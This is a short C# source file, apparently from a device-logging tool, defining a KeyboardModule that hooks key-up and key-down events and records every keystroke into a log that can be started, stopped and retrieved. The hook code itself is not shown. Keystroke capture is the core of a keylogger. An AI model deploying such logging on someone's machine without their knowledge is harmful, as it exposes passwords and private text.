using DeviceLog.Classes.Log;

namespace DeviceLog.Classes.Modules.Keyboard
{
    internal class KeyboardModule
    {
        private readonly KeyboardHook _keyboardHook;
        private readonly KeyboardLog _log;

        internal KeyboardModule(bool keyUp, bool keyDown)
        {
            _keyboardHook = new KeyboardHook();
            _log = new KeyboardLog();

            if (keyUp)
            {
                _keyboardHook.KeyUp += KeyUp;
            }

            if (keyDown)
            {
                _keyboardHook.KeyDown += KeyDown;
            }
        }

        private void KeyDown(string key)
        {
            _log.AddKey(key);
        }

        private void KeyUp(string key)
        {
            _log.AddKey(key);
        }

        internal void Start()
        {
            _keyboardHook.Hook();
        }

        internal void Stop()
        {
            _keyboardHook.Unhook();
        }

        internal KeyboardLog GetLog()
        {
            return _log;
        }
    }
}
